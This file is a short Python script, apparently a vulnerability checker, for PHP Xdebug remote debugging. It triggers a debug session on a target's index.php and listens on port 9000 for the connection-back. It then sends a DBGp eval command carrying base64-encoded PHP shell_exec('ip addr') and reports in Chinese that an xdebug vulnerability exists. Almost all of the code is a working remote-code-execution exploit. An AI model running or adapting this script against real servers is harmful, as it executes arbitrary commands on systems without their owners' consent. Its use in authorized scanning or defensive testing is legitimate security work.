import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor

def connect(ip):
    session = requests.session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    url = f"{ip}/index.php"
    time.sleep(2)
    ip_port = ('0.0.0.0', 9000)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    try:
        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
    except:
        pass
    try:
        conn, addr = sk.accept()
        code="shell_exec('ip addr');"

        conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(code.encode()), b'\x00']))
        # print(args.code.encode())
        sock=conn
        blocks = []
        data = b''
        while True:
            try:
                data = data + sock.recv(1024)
            except socket.error as e:
                break
            if not data:
                break

            while data:
                eop = data.find(b'\x00')
                if eop < 0:
                    break
                blocks.append(data[:eop])
                data = data[eop + 1:]

            if len(blocks) >= 4:
                break

        data =blocks[3]

        g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
        if not g:
            print('[-] No result...')
            sys.exit(0)

        data = g.group(1)

        try:
            # print('[+] Result: ' + base64.b64decode(data).decode())
            print("存在xdebug漏洞")
        except binascii.Error:
            print('[-] May be not string result...')
    except:
        pass
# connect("192.168.28.128")